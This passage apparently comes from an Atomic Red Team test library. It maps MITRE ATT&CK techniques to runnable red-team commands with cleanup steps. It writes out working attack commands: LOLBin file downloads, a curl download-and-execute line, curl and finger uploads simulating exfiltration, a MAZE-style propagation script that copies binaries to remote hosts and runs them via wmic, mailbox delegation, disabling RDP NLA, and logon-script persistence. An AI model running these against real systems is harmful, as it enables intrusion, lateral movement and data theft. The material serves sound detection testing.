"command_prompt", "command": "finger base64_filedata@#{remote_host}\n"}}, {"name": "Download a file with IMEWDBLD.exe", "auto_generated_guid": "1a02df58-09af-4064-a765-0babe1a0d1e2", "description": "Use IMEWDBLD.exe (built-in to windows) to download a file. This will throw an error for an invalid dictionary file.\nDownloaded files can be found in \"%LocalAppData%\\Microsoft\\Windows\\INetCache\\<8_RANDOM_ALNUM_CHARS>/<FILENAME>[1].<EXTENSION>\" or `%LocalAppData%\\Microsoft\\Windows\\INetCache\\IE\\<8_RANDOM_ALNUM_CHARS>/<FILENAME>[1].<EXTENSION>.\nRun \"Get-ChildItem -Path C:\\Users\\<USERNAME>\\AppData\\Local\\Microsoft\\Windows\\INetCache\\ -Include <FILENAME>* -Recurse -Force -File -ErrorAction SilentlyContinue\" without quotes and adding the correct username and file name to locate the file.\n", "supported_platforms": ["windows"], "input_arguments": {"remote_url": {"description": "Location of file to be downloaded.", "type": "url", "default": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1105/T1105.yaml"}, "file_name": {"description": "Name of the file to be downloaded without extension.", "type": "string", "default": "T1105"}}, "executor": {"command": "$imewdbled = $env:SystemRoot + \"\\System32\\IME\\SHARED\\IMEWDBLD.exe\"\n& $imewdbled #{remote_url}\n", "cleanup_command": "$inetcache = $env:LOCALAPPDATA + \"\\Microsoft\\Windows\\INetCache\\\" \n$file_to_be_removed = [string[]] (Get-ChildItem -Path $inetcache -Include #{file_name}* -Recurse -Force -File -ErrorAction SilentlyContinue)\nif(\"\" -ne \"$file_to_be_removed\") { Remove-Item \"$file_to_be_removed\" -ErrorAction Ignore }\n", "name": "powershell"}}, {"name": "Curl Download File", "auto_generated_guid": "2b080b99-0deb-4d51-af0f-833d37c4ca6a", "description": "The following Atomic utilizes native curl.exe, or downloads it if not installed, to download a remote DLL and output to a number of directories to simulate malicious behavior.\nExpected output will include whether the file downloaded successfully or not.\n", "supported_platforms": ["windows"], "input_arguments": {"file_download": {"description": "File to download", "type": "string", "default": "https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll"}, "curl_path": {"description": "path to curl.exe", "type": "path", "default": "C:\\Windows\\System32\\Curl.exe"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "Curl must be installed on system.\n", "prereq_command": "if (Test-Path #{curl_path}) {exit 0} else {exit 1}\n", "get_prereq_command": "Invoke-WebRequest \"https://curl.se/windows/dl-7.79.1/curl-7.79.1-win64-mingw.zip\" -Outfile \"PathToAtomicsFolder\\..\\ExternalPayloads\\curl.zip\"\nExpand-Archive -Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\curl.zip\" -DestinationPath \"PathToAtomicsFolder\\..\\ExternalPayloads\\curl\"\nCopy-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\curl\\curl-7.79.1-win64-mingw\\bin\\curl.exe\" C:\\Windows\\System32\\Curl.exe\nRemove-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\curl\"\nRemove-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\curl.zip\"\n"}], "executor": {"command": "#{curl_path} -k #{file_download} -o c:\\users\\public\\music\\allthethingsx64.dll\n#{curl_path} -k #{file_download} --output c:\\users\\public\\music\\allthethingsx64.dll\n#{curl_path} -k #{file_download} -o c:\\programdata\\allthethingsx64.dll\n#{curl_path} -k #{file_download} -o %Temp%\\allthethingsx64.dll\n", "cleanup_command": "del c:\\users\\public\\music\\allthethingsx64.dll >nul 2>&1\ndel c:\\users\\public\\music\\allthethingsx64.dll >nul 2>&1\ndel c:\\programdata\\allthethingsx64.dll >nul 2>&1\ndel %Temp%\\allthethingsx64.dll >nul 2>&1\n", "name": "command_prompt"}}, {"name": "Curl Upload File", "auto_generated_guid": "635c9a38-6cbf-47dc-8615-3810bc1167cf", "description": "The following Atomic utilizes native curl.exe, or downloads it if not installed, to upload a txt file to simulate data exfiltration\nExpected output will include whether the file uploaded successfully or not.\n", "supported_platforms": ["windows"], "input_arguments": {"curl_path": {"description": "path to curl.exe", "type": "path", "default": "C:\\Windows\\System32\\Curl.exe"}, "remote_destination": {"description": "Remote destination", "type": "string", "default": "www.example.com"}, "file_path": {"description": "File to upload", "type": "string", "default": "c:\\temp\\atomictestfile.txt"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "Curl must be installed on system.\n", "prereq_command": "if (Test-Path #{curl_path}) {exit 0} else {exit 1}\n", "get_prereq_command": "Invoke-WebRequest \"https://curl.se/windows/dl-7.79.1/curl-7.79.1-win64-mingw.zip\" -Outfile PathToAtomicsFolder\\..\\ExternalPayloads\\curl.zip\nExpand-Archive -Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\curl.zip\" -DestinationPath \"PathToAtomicsFolder\\..\\ExternalPayloads\\curl\"\nCopy-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\curl\\curl-7.79.1-win64-mingw\\bin\\curl.exe\" C:\\Windows\\System32\\Curl.exe\nRemove-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\curl\"\nRemove-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\curl.zip\"\n"}, {"description": "A file must be created to upload\n", "prereq_command": "if (Test-Path #{file_path}) {exit 0} else {exit 1}\n", "get_prereq_command": "echo \"This is an Atomic Test File\" > #{file_path}\n"}], "executor": {"command": "#{curl_path} -T #{file_path} #{remote_destination}\n#{curl_path} --upload-file #{file_path} #{remote_destination}\n#{curl_path} -d #{file_path} #{remote_destination}\n#{curl_path} --data #{file_path} #{remote_destination}\n", "name": "command_prompt"}}, {"name": "Download a file with Microsoft Connection Manager Auto-Download", "auto_generated_guid": "d239772b-88e2-4a2e-8473-897503401bcc", "description": "Uses the cmdl32 to download arbitrary file from the internet. The cmdl32 package is allowed to install the profile used to launch the VPN connection. However, the config is modified to download the arbitary file. \nThe issue of cmdl32.exe detecting and deleting the payload by identifying it as not a VPN Servers profile is avoided by setting a temporary TMP folder and denying the delete permission to all files for the user.\nUpon successful execution the test will open calculator and Notepad executable for 10 seconds.\nreference:\nhttps://twitter.com/ElliotKillick/status/1455897435063074824\nhttps://github.com/LOLBAS-Project/LOLBAS/pull/151\nhttps://lolbas-project.github.io/lolbas/Binaries/Cmdl32/\nhttps://strontic.github.io/xcyclopedia/library/cmdl32.exe-FA1D5B8802FFF4A85B6F52A52C871BBB.html\n", "supported_platforms": ["windows"], "input_arguments": {"Path_to_file": {"description": "Path to the Batch script", "type": "path", "default": "PathToAtomicsFolder\\T1105\\src\\T1105.bat"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "#{Path_to_file} must exist on system.\n", "prereq_command": "if (Test-Path \"#{Path_to_file}\") {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory (split-path \"#{Path_to_file}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1105/src/T1105.bat\" -OutFile \"#{Path_to_file}\"\n"}], "executor": {"command": "\"#{Path_to_file}\" 1>NUL \n", "cleanup_command": "del /f/s/q %temp%\\T1105 >nul 2>&1\nrmdir /s/q %temp%\\T1105 >nul 2>&1\n", "name": "command_prompt"}}, {"name": "MAZE Propagation Script", "auto_generated_guid": "70f4d07c-5c3e-4d53-bb0a-cdf3ada14baf", "description": "This test simulates MAZE ransomware's propogation script that searches through a list of computers, tests connectivity to them, and copies a binary file to the Windows\\Temp directory of each one. \nUpon successful execution, a specified binary file will attempt to be copied to each online machine, a list of the online machines, as well as a list of offline machines will be output to a specified location.\nReference: https://www.fireeye.com/blog/threat-research/2020/05/tactics-techniques-procedures-associated-with-maze-ransomware-incidents.html \n", "supported_platforms": ["windows"], "input_arguments": {"binary_file": {"description": "Binary file to copy to remote machines", "type": "string", "default": "$env:comspec"}, "exe_remote_folder": {"description": "Path to store executable on remote machine (no drive letter)", "type": "string", "default": "\\Windows\\Temp\\T1105.exe"}, "remote_drive_letter": {"description": "Remote drive letter", "type": "string", "default": "C"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "Binary file must exist at specified location (#{binary_file})\n", "prereq_command": "if (Test-Path #{binary_file}) {exit 0} else {exit 1}\n", "get_prereq_command": "write-host \"The binary_file input parameter must be set to a binary that exists on this computer.\"\n"}, {"description": "Machine list must exist at specified location (\"PathToAtomicsFolder\\..\\ExternalPayloads\\T1105MachineList.txt\")\n", "prereq_command": "if (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1105MachineList.txt\") {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nnew-item -path \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1105MachineList.txt\" | Out-Null\necho \"A machine list file has been generated at \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1105MachineList.txt\". Please enter the machines to target there, one machine per line.\"\n"}], "executor": {"command": "$machine_list = \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1105MachineList.txt\"\n$offline_list = \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1105OfflineHosts.txt\"\n$completed_list = \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1105CompletedHosts.txt\"\nforeach ($machine in get-content -path \"$machine_list\")\n{if (test-connection -Count 1 -computername $machine -quiet) \n{cmd /c copy \"#{binary_file}\" \"\\\\$machine\\#{remote_drive_letter}$#{exe_remote_folder}\"\necho $machine >> \"$completed_list\"\nwmic /node: \"$machine\" process call create \"regsvr32.exe /i #{remote_drive_letter}:#{exe_remote_folder}\"}\nelse\n{echo $machine >> \"$offline_list\"}}\n", "cleanup_command": "if (test-path \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1105CompletedHosts.txt\") \n{foreach ($machine in get-content -path \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1105CompletedHosts.txt\")\n{wmic /node: \"$machine\" process where name='\"regsvr32.exe\"' call terminate | out-null\nRemove-Item -path \"\\\\$machine\\#{remote_drive_letter}$#{exe_remote_folder}\" -force -erroraction silentlycontinue}}\nRemove-Item -path \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1105OfflineHosts.txt\" -erroraction silentlycontinue\nRemove-item -path \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1105CompletedHosts.txt\" -erroraction silentlycontinue\n", "name": "powershell"}}, {"name": "Printer Migration Command-Line Tool UNC share folder into a zip file", "auto_generated_guid": "49845fc1-7961-4590-a0f0-3dbcf065ae7e", "description": "Create a ZIP file from a folder in a remote drive\n", "supported_platforms": ["windows"], "input_arguments": {"Path_unc": {"description": "Path to the UNC folder", "type": "path", "default": "\\\\127.0.0.1\\c$\\AtomicRedTeam\\atomics\\T1105\\src\\"}, "Path_PrintBrm": {"description": "Path to PrintBrm.exe", "type": "path", "default": "C:\\Windows\\System32\\spool\\tools\\PrintBrm.exe"}}, "executor": {"command": "del %TEMP%\\PrintBrm.zip >nul 2>&1 \n#{Path_PrintBrm} -b -d #{Path_unc}  -f %TEMP%\\PrintBrm.zip -O FORCE\n", "cleanup_command": "del %TEMP%\\PrintBrm.zip >nul 2>&1\n", "name": "command_prompt"}}, {"name": "Lolbas replace.exe use to copy file", "auto_generated_guid": "54782d65-12f0-47a5-b4c1-b70ee23de6df", "description": "Copy file.cab to destination\nReference: https://lolbas-project.github.io/lolbas/Binaries/Replace/\n", "supported_platforms": ["windows"], "input_arguments": {"replace_cab": {"description": "Path to the cab file", "type": "path", "default": "PathToAtomicsFolder\\T1105\\src\\redcanary.cab"}, "Path_replace": {"description": "Path to replace.exe", "type": "path", "default": "C:\\Windows\\System32\\replace.exe"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "#{replace_cab} must exist on system.\n", "prereq_command": "if (Test-Path \"#{replace_cab}\") {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory (split-path \"#{replace_cab}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1105/src/redcanary.cab\" -OutFile \"#{replace_cab}\"\n"}], "executor": {"command": "del %TEMP%\\redcanary.cab >nul 2>&1\n#{Path_replace} \"#{replace_cab}\" %TEMP% /A\n", "cleanup_command": "del %TEMP%\\redcanary.cab >nul 2>&1\n", "name": "command_prompt"}}, {"name": "Lolbas replace.exe use to copy UNC file", "auto_generated_guid": "ed0335ac-0354-400c-8148-f6151d20035a", "description": "Copy UNC file to destination\nReference: https://lolbas-project.github.io/lolbas/Binaries/Replace/\n", "supported_platforms": ["windows"], "input_arguments": {"replace_cab": {"description": "UNC Path to the cab file", "type": "path", "default": "\\\\127.0.0.1\\c$\\AtomicRedTeam\\atomics\\T1105\\src\\redcanary.cab"}, "Path_replace": {"description": "Path to replace.exe", "type": "path", "default": "C:\\Windows\\System32\\replace.exe"}}, "executor": {"command": "del %TEMP%\\redcanary.cab >nul 2>&1\n#{Path_replace} #{replace_cab} %TEMP% /A\n", "cleanup_command": "del %TEMP%\\redcanary.cab >nul 2>&1\n", "name": "command_prompt"}}, {"name": "certreq download", "auto_generated_guid": "6fdaae87-c05b-42f8-842e-991a74e8376b", "description": "Use certreq to download a file from the web", "supported_platforms": ["windows"], "input_arguments": {"local_path": {"description": "Local path to place file", "type": "string", "default": "%temp%\\Atomic-license.txt"}, "remote_file": {"description": "URL of file to copy", "type": "url", "default": "https://example.com"}}, "executor": {"command": "certreq.exe -Post -config #{remote_file} c:\\windows\\win.ini #{local_path}", "cleanup_command": "del #{local_path} >nul 2>&1", "name": "command_prompt"}}, {"name": "Download a file using wscript", "auto_generated_guid": "97116a3f-efac-4b26-8336-b9cb18c45188", "description": "Use wscript to run a local VisualBasic file to download a remote file", "supported_platforms": ["windows"], "input_arguments": {"vbscript_file": {"description": "Full path to the VisualBasic downloading the file", "type": "string", "default": "PathToAtomicsFolder\\T1105\\src\\T1105-download-file.vbs"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "#{vbscript_file} must be exist on system.\n", "prereq_command": "if (Test-Path \"#{vbscript_file}\") {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory (split-path \"#{vbscript_file}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1105/src/T1105-download-file.vbs\" -OutFile \"#{vbscript_file}\"\n"}], "executor": {"command": "wscript.exe \"#{vbscript_file}\"\n", "cleanup_command": "del Atomic-License.txt >nul 2>&1", "name": "command_prompt"}}, {"name": "Linux Download File and Run", "auto_generated_guid": "bdc373c5-e9cf-4563-8a7b-a9ba720a90f3", "description": "Utilize linux Curl to download a remote file, chmod +x it and run it.\n", "supported_platforms": ["linux"], "input_arguments": {"remote_url": {"description": "url of remote payload", "type": "string", "default": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1105/src/atomic.sh"}, "payload_name": {"description": "payload name", "type": "string", "default": "atomic.sh"}}, "executor": {"command": "curl -sO #{remote_url}; chmod +x #{payload_name} | bash #{payload_name}\n", "cleanup_command": "rm #{payload_name}\n", "name": "sh"}}, {"name": "Nimgrab - Transfer Files", "auto_generated_guid": "b1729c57-9384-4d1c-9b99-9b220afb384e", "description": "Use nimgrab.exe to download a file from the web. \n", "supported_platforms": ["windows"], "input_arguments": {"remote_file": {"description": "URL of file to copy", "type": "url", "default": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt"}, "destination_path": {"description": "Destination path to file", "type": "path", "default": "$env:TEMP\\Atomic-license.txt"}}, "executor": {"command": "cmd /c \"PathToAtomicsFolder\\..\\ExternalPayloads\\nimgrab.exe\" #{remote_file} #{destination_path}\n", "cleanup_command": "del #{destination_path} >nul 2>&1\n", "name": "command_prompt"}, "dependency_executor_name": "powershell", "dependencies": [{"description": "NimGrab must be installed on system.\n", "prereq_command": "if (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\nimgrab.exe\") {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://nim-lang.org/download/nim-1.6.6_x64.zip\" -Outfile \"PathToAtomicsFolder\\..\\ExternalPayloads\\nim.zip\"\nExpand-Archive -Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\nim.zip\" -DestinationPath \"PathToAtomicsFolder\\..\\ExternalPayloads\\nim\" -Force\nCopy-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\nim\\nim-1.6.6\\bin\\nimgrab.exe\" \"PathToAtomicsFolder\\..\\ExternalPayloads\\nimgrab.exe\"\n"}]}, {"name": "iwr or Invoke Web-Request download", "auto_generated_guid": "c01cad7f-7a4c-49df-985e-b190dcf6a279", "description": "Use 'iwr' or \"Invoke-WebRequest\" -URI argument to download a file from the web. Note: without -URI also works in some versions.\n", "supported_platforms": ["windows"], "input_arguments": {"remote_file": {"description": "URL of file to copy", "type": "url", "default": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt"}, "local_path": {"description": "Local path to place file", "type": "path", "default": "%temp%\\Atomic-license.txt"}}, "executor": {"command": "powershell.exe iwr -URI #{remote_file} -Outfile #{local_path}\n", "cleanup_command": "del %temp%\\Atomic-license.txt >nul 2>&1\n", "name": "command_prompt", "elevation_required": true}}]}, "T1098.002": {"name": "Additional Email Delegate Permissions", "technique_id": "attack-pattern--e74de37c-a829-446c-937d-56a44f0e9306", "external_id": "T1098.002", "data_components": ["Group Modification", "User Account Modification", "Application Log Content"], "kill_chain_phases": ["persistence"], "data_source_platforms": [], "mitigations": ["course-of-action--9bb9e696-bff8-4ae1-9454-961fc7d91d5f", "course-of-action--b045d015-6bed-4490-bd38-56b41ece59a0", "course-of-action--eb88d97c-32f1-40be-80f0-d61a4b0b4b31"], "description": "Adversaries may grant additional permission levels to maintain persistent access to an adversary-controlled email account. \n\nFor example, the <code>Add-MailboxPermission</code> [PowerShell](https://attack.mitre.org/techniques/T1059/001) cmdlet, available in on-premises Exchange and in the cloud-based service Office 365, adds permissions to a mailbox.(Citation: Microsoft - Add-MailboxPermission)(Citation: FireEye APT35 2018)(Citation: Crowdstrike Hiding in Plain Sight 2018) In Google Workspace, delegation can be enabled via the Google Admin console and users can delegate accounts via their Gmail settings.(Citation: Gmail Delegation)(Citation: Google Ensuring Your Information is Safe) \n\nAdversaries may also assign mailbox folder permissions through individual folder permissions or roles. In Office 365 environments, adversaries may assign the Default or Anonymous user permissions or roles to the Top of Information Store (root), Inbox, or other mailbox folders. By assigning one or both user permissions to a folder, the adversary can utilize any other account in the tenant to maintain persistence to the target user\u2019s mail folders.(Citation: Remediation and Hardening Strategies for Microsoft 365 to Defend Against UNC2452)\n\nThis may be used in persistent threat incidents as well as BEC (Business Email Compromise) incidents where an adversary can add [Additional Cloud Roles](https://attack.mitre.org/techniques/T1098/003) to the accounts they wish to compromise. This may further enable use of additional techniques for gaining access to systems. For example, compromised business accounts are often used to send messages to other accounts in the network of the target business while creating inbox rules (ex: [Internal Spearphishing](https://attack.mitre.org/techniques/T1534)), so the messages evade spam/phishing detection mechanisms.(Citation: Bienstock, D. - Defending O365 - 2019)", "atomic_tests": [{"name": "EXO - Full access mailbox permission granted to a user", "auto_generated_guid": "17d046be-fdd0-4cbb-b5c7-55c85d9d0714", "description": "Give a nominated user, full mailbox delegation access of another user.\nThis can be used by an adversary to maintain persistent access to a target's mailbox in M365.\n", "supported_platforms": ["office-365"], "input_arguments": {"username": {"description": "office-365 username", "type": "string", "default": "o365_user_test@contoso.com"}, "password": {"description": "office-365 password", "type": "string", "default": "o365_password_test"}, "delegate_target": {"description": "office-365 target_email", "type": "string", "default": "delegate@contoso.com"}, "operator_mailbox": {"description": "office-365 target_email", "type": "string", "default": "operator@contoso.com"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "ExchangeOnlineManagement PowerShell module must be installed\n", "prereq_command": "$RequiredModule = Get-Module -Name ExchangeOnlineManagement -ListAvailable\nif (-not $RequiredModule) {exit 1}\nif (-not $RequiredModule.ExportedCommands['Connect-ExchangeOnline']) {exit 1} else {exit 0}\n", "get_prereq_command": "Install-Module -Name ExchangeOnlineManagement         \n"}], "executor": {"command": "Import-Module ExchangeOnlineManagement\n$secure_pwd = \"#{password}\" | ConvertTo-SecureString -AsPlainText -Force\n$creds = New-Object System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $secure_pwd\nConnect-ExchangeOnline -Credential $creds\nAdd-MailboxPermission -Identity \"#{delegate_target}\" -User \"#{operator_mailbox}\" -AccessRights FullAccess -InheritanceType All\nDisconnect-ExchangeOnline -Confirm:$false\n", "cleanup_command": "Import-Module ExchangeOnlineManagement\n$secure_pwd = \"#{password}\" | ConvertTo-SecureString -AsPlainText -Force\n$creds = New-Object System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $secure_pwd\nConnect-ExchangeOnline -Credential $creds\nRemove-MailboxPermission -Identity \"#{delegate_target}\" -User \"#{operator_mailbox}\" -AccessRights FullAccess -InheritanceType All -Confirm:$false\nDisconnect-ExchangeOnline -Confirm:$false\n", "name": "powershell", "elevation_required": false}}]}, "T1021.001": {"name": "Remote Desktop Protocol", "technique_id": "attack-pattern--eb062747-2193-45de-8fa2-e62549c37ddf", "external_id": "T1021.001", "data_components": ["Network Connection Creation", "Process Creation", "Network Traffic Flow", "Logon Session Creation"], "kill_chain_phases": ["lateral-movement"], "data_source_platforms": [], "mitigations": ["course-of-action--1dcaeb21-9348-42ea-950a-f842aaf1ae1f", "course-of-action--2f316f6c-ae42-44fe-adf8-150989e0f6d3", "course-of-action--86598de0-b347-4928-9eb0-0acbfc21908c", "course-of-action--93e7968a-9074-4eac-8ae9-9f5200ec3317", "course-of-action--9bb9e696-bff8-4ae1-9454-961fc7d91d5f", "course-of-action--b045d015-6bed-4490-bd38-56b41ece59a0", "course-of-action--cc2399fd-3cd3-4319-8d0a-fbd6420cdaf8", "course-of-action--eb88d97c-32f1-40be-80f0-d61a4b0b4b31"], "description": "Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to log into a computer using the Remote Desktop Protocol (RDP). The adversary may then perform actions as the logged-on user.\n\nRemote desktop is a common feature in operating systems. It allows a user to log into an interactive session with a system desktop graphical user interface on a remote system. Microsoft refers to its implementation of the Remote Desktop Protocol (RDP) as Remote Desktop Services (RDS).(Citation: TechNet Remote Desktop Services) \n\nAdversaries may connect to a remote system over RDP/RDS to expand access if the service is enabled and allows access to accounts with known credentials. Adversaries will likely use Credential Access techniques to acquire credentials to use with RDP. Adversaries may also use RDP in conjunction with the [Accessibility Features](https://attack.mitre.org/techniques/T1546/008) or [Terminal Services DLL](https://attack.mitre.org/techniques/T1505/005) for Persistence.(Citation: Alperovitch Malware)", "atomic_tests": [{"name": "RDP to DomainController", "auto_generated_guid": "355d4632-8cb9-449d-91ce-b566d0253d3e", "description": "Attempt an RDP session via Remote Desktop Application to a DomainController.\n", "supported_platforms": ["windows"], "input_arguments": {"logonserver": {"description": "ComputerName argument default %logonserver%", "type": "string", "default": "$ENV:logonserver.TrimStart(\"\\\")"}, "domain": {"description": "domain argument default %USERDOMAIN%", "type": "string", "default": "$Env:USERDOMAIN"}, "username": {"description": "Username argument default %username%", "type": "string", "default": "$ENV:USERNAME"}, "password": {"description": "Password", "type": "string", "default": "1password2!"}}, "dependencies": [{"description": "Computer must be domain joined\n", "prereq_command": "if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain) { exit 0} else { exit 1}\n", "get_prereq_command": "Write-Host Joining this computer to a domain must be done manually\n"}], "executor": {"command": "$Server=#{logonserver}\n$User = Join-Path #{domain} #{username}\n$Password=\"#{password}\"\ncmdkey /generic:TERMSRV/$Server /user:$User /pass:$Password\nmstsc /v:$Server\necho \"RDP connection established\"\n", "cleanup_command": "$p=Tasklist /svc /fi \"IMAGENAME eq mstsc.exe\" /fo csv | convertfrom-csv\nif(-not ([string]::IsNullOrEmpty($p.PID))) { Stop-Process -Id $p.PID }\n", "name": "powershell"}}, {"name": "Changing RDP Port to Non Standard Port via Powershell", "auto_generated_guid": "2f840dd4-8a2e-4f44-beb3-6b2399ea3771", "description": "Changing RDP Port to Non Standard Port via Powershell\n", "supported_platforms": ["windows"], "input_arguments": {"OLD_Remote_Port": {"description": "Default RDP Listening Port", "type": "string", "default": "3389"}, "NEW_Remote_Port": {"description": "New RDP Listening Port", "type": "string", "default": "4489"}}, "executor": {"command": "Set-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp' -name \"PortNumber\" -Value #{NEW_Remote_Port}\nNew-NetFirewallRule -DisplayName 'RDPPORTLatest-TCP-In' -Profile 'Public' -Direction Inbound -Action Allow -Protocol TCP -LocalPort #{NEW_Remote_Port}\n", "cleanup_command": "Set-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp' -name \"PortNumber\" -Value #{OLD_Remote_Port}\nRemove-NetFirewallRule -DisplayName \"RDPPORTLatest-TCP-In\" -ErrorAction Ignore \nGet-Service TermService | Restart-Service -Force -ErrorAction Ignore \n", "name": "powershell", "elevation_required": true}}, {"name": "Changing RDP Port to Non Standard Port via Command_Prompt", "auto_generated_guid": "74ace21e-a31c-4f7d-b540-53e4eb6d1f73", "description": "Changing RDP Port to Non Standard Port via Command_Prompt\n", "supported_platforms": ["windows"], "input_arguments": {"OLD_Remote_Port": {"description": "Default RDP Listening Port", "type": "string", "default": "3389"}, "NEW_Remote_Port": {"description": "New RDP Listening Port", "type": "string", "default": "4489"}}, "executor": {"command": "reg add \"HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /v PortNumber /t REG_DWORD /d #{NEW_Remote_Port} /f\nnetsh advfirewall firewall add rule name=\"RDPPORTLatest-TCP-In\" dir=in action=allow protocol=TCP localport=#{NEW_Remote_Port}\n", "cleanup_command": "reg add \"HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /v PortNumber /t REG_DWORD /d #{OLD_Remote_Port} /f >nul 2>&1\nnetsh advfirewall firewall delete rule name=\"RDPPORTLatest-TCP-In\" >nul 2>&1\nnet stop TermService /y >nul 2>&1\nnet start TermService >nul 2>&1\n", "name": "command_prompt", "elevation_required": true}}, {"name": "Disable NLA for RDP via Command Prompt", "auto_generated_guid": "01d1c6c0-faf0-408e-b368-752a02285cb2", "description": "Disables network-level authentication (NLA) for RDP by changing a registry key via Command Prompt\nDisabling NLA for RDP can allow remote user interaction with the Windows sign-in screen prior to authentication. According to Microsoft, Flax Typhoon actors used this technique implementation to achieve persistence on victim systems: https://www.microsoft.com/en-us/security/blog/2023/08/24/flax-typhoon-using-legitimate-software-to-quietly-access-taiwanese-organizations/\nSee also: https://github.com/EmpireProject/Empire/blob/master/lib/modules/powershell/management/enable_rdp.py\n", "supported_platforms": ["windows"], "input_arguments": {"Default_UserAuthentication": {"description": "Default UserAuthentication registry value", "type": "string", "default": "1"}}, "executor": {"command": "reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /v UserAuthentication /d 0 /t REG_DWORD /f\n", "cleanup_command": "reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /v UserAuthentication /d #{Default_UserAuthentication} /t REG_DWORD -f >nul 2>&1\n", "name": "command_prompt"}}]}, "T1037.001": {"name": "Logon Script (Windows)", "technique_id": "attack-pattern--eb125d40-0b2d-41ac-a71a-3229241c2cd3", "external_id": "T1037.001", "data_components": ["Command Execution", "Process Creation", "Windows Registry Key Creation"], "kill_chain_phases": ["persistence", "privilege-escalation"], "data_source_platforms": [], "mitigations": ["course-of-action--a2c36a5d-4058-475e-8e77-fff75e50d3b9"], "description": "Adversaries may use Windows logon scripts automatically executed at logon initialization to establish persistence. Windows allows logon scripts to be run whenever a specific user or group of users log into a system.(Citation: TechNet Logon Scripts) This is done via adding a path to a script to the <code>HKCU\\Environment\\UserInitMprLogonScript</code> Registry key.(Citation: Hexacorn Logon Scripts)\n\nAdversaries may use these scripts to maintain persistence on a single system. Depending on the access configuration of the logon scripts, either local credentials or an administrator account may be necessary. ", "atomic_tests": [{"name": "Logon Scripts", "auto_generated_guid": "d6042746-07d4-4c92-9ad8-e644c114a231", "description": "Adds a registry value to run batch script created in the %temp% directory. Upon execution, there will be a new environment variable in the HKCU\\Environment key\nthat can be viewed in the Registry Editor.\n", "supported_platforms": ["windows"], "input_arguments": {"script_path": {"description": "Path to .bat file", "type": "string", "default": "%temp%\\art.bat"}, "script_command": {"description": "Command To Execute", "type": "string", "default": "echo Art \"Logon Script\" atomic test was successful. >> %USERPROFILE%\\desktop\\T1037.001-log.txt"}}, "executor": {"command": "echo \"#{script_command}\" > #{script_path}\nREG.exe ADD HKCU\\Environment /v UserInitMprLogonScript /t REG_SZ /d \"#{script_path}\" /f\n", "cleanup_command": "REG.exe DELETE HKCU\\Environment /v UserInitMprLogonScript /f >nul 2>&1\ndel #{script_path} >nul 2>&1\ndel \"%USERPROFILE%\\desktop\\T1037.001-log.txt\" >nul 2>&1\n", "name": "command_prompt"}}]}, "T1220": {"name": "XSL Script Processing", "technique_id": "attack-pattern--ebbe170d-aa74-4946-8511-9921243415a3", "external_id": "T1220", "data_components": ["Process Creation", "Module Load"], "kill_chain_phases": ["defense-evasion"], "data_source_platforms": [], "mitigations": 